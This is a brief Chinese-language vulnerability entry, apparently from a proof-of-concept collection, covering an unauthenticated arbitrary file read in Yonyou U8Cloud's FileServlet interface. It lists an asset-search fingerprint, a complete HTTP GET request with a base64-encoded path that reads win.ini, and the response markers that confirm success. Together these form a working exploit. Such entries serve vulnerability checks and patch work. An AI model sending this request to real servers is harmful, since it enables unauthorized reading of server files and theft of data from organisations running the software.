﻿# 用友U8Cloud-FileServlet 任意文件读取漏洞

> 更新时间：2024-03-27

> 漏洞编号：

> 漏洞说明：用友U8Cloud FileServlet接口存在任意文件读取漏洞，未授权的攻击者可通过此漏洞获取服务器文件，从而盗取服务器数据，造成服务器信息泄露。

> 漏洞特征：app="用友-U8-Cloud"

> 验证脚本：HTTP

```
GET /service/~hrpub/nc.bs.hr.tools.trans.FileServlet?path=QzovL3dpbmRvd3Mvd2luLmluaQ== HTTP/1.1

```

> 响应代码特征：200

> 响应内容特征：support

> 上传文件定位：

> 验证文件来源：用友U8Cloud-FileServlet 任意文件读取漏洞.poc

